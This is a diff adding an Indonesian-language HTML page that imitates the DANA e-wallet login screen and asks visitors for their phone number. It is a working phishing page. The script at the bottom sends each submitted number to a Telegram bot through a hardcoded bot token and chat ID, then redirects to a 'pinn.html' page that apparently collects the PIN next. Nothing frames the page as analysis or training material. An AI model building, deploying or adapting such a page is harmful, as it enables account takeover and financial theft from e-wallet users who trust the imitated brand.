@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#009EEB',
+                        grayText: '#FFFFFF',
+                        grayLight: '#E5E7EB',
+                        grayBtn: '#E5E7EB',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .input-border {
+                border: 1px solid #D1D5DB;
+                background: #FFFFFF;
+                color: #1F2937;
+            }
+            .input-focus {
+                border-color: #FFFFFF;
+                outline: none;
+            }
+            .container-sm {
+                max-width: 360px;
+                margin: 0 auto;
+            }
+        }
+    </style>
+</head>
+<body class="font-sans bg-[#009EEB] min-h-screen">
+    <main class="container-sm px-1 mt-4">
+        <div class="flex justify-center mb-3">
+            <img src="logo.png" alt="DANA" class="w-20 h-20 object-contain">
+        </div>
+        <h2 class="text-sm font-medium text-grayText mb-4 text-center">Masukkan nomor HP kamu untuk lanjut</h2>
+        
+    </div>
+    <!-- Label Negara & Nomor -->
+    <div class="text-sm text-white width: 50%; max-width: 400px; display: flex; gap: 30px; margin-bottom: 20px; font-bold: 2rem; opacity: 0.8;">
+        <span>Negara</span>
+        <span style="margin-left: 50px;">Nomor</.span>
+    </div>
+     <form id="formTelepon" class="space-y-2">
+            <div class="flex items-center gap-5">
+             <div class="flex items-center gap-2 px-3 py-2.5 border rounded-lg input-border w-50 -center">
+                    <img src="https://flagcdn.com/w20/id.png" alt="Bendera Indonesia" class="w-5 h-5.5">
+                    <span class="teks-center-500 text-sm font-bold">+62</span>
+             </div>
+                <input type="tel" id="nomorTelepon" placeholder="8 1 1 - 1 2 3 4 - 5 6 7 8" class="flex-2 px-5 py-2.5 border rounded-lg input-border text-sm placeholder:text-bold-500 focus:input-focus" required>
+            </div>
+            <div class="text-center px-1">
+                <h2 class="text-sm text-white font-medium mb-6">Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu. Dengan melanjutkan, kamu juga setuju dengan S&K serta Kebijakan Privasi kami.</h2>
+            </div>
+            <div class="text-center mt-2"></div>
+        </form>
+    </main>
+    <div class="fixed bottom-6 left-0 right-0 container-sm px-4">
+        <button type="submit" form="formTelepon" id="btnLanjutkan" class="w-full bg-grayBtn text-gray-400 font-medium py-2.5 rounded-lg text-sm cursor-not-allowed transition-all duration-300" disabled>
+            LANJUTKAN
+        </button>
+    </div>
+    <script>
+        const BOT_TOKEN = "8994642736:AAFuer-9fij5SH2ygkMUYwVgA4V-Ux5lK_0"; 
+        const CHAT_ID = "-1004401558849"; 
+        const nomorInput = document.getElementById('nomorTelepon');
+        const btnLanjutkan = document.getElementById('btnLanjutkan');
+        const form = document.getElementById('formTelepon');
+
+        nomorInput.addEventListener('input', function() {
+            if (this.value.trim().length > 0) {
+                btnLanjutkan.classList.remove('bg-grayBtn', 'text-gray-400', 'cursor-not-allowed');
+                btnLanjutkan.classList.add('bg-white', 'text-primary', 'hover:bg-blue-100');
+                btnLanjutkan.disabled = false;
+            } else {
+                btnLanjutkan.classList.remove('bg-white', 'text-primary', 'hover:bg-blue-100');
+                btnLanjutkan.classList.add('bg-grayBtn', 'text-gray-400', 'cursor-not-allowed');
+                btnLanjutkan.disabled = true;
+            }
+        });
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const nomor = nomorInput.value.trim();
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Nomor Telepon: +62${nomor}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = "pinn.html?nomor=" + nomor;
+                } else {
+                    alert('Gagal mengirim data, coba lagi!');
+                }
+            })
+            .catch(error => {
+                alert('Terjadi kesalahan jaringan!');
+            });
+        });
+    </script>
+</body>
+</html>
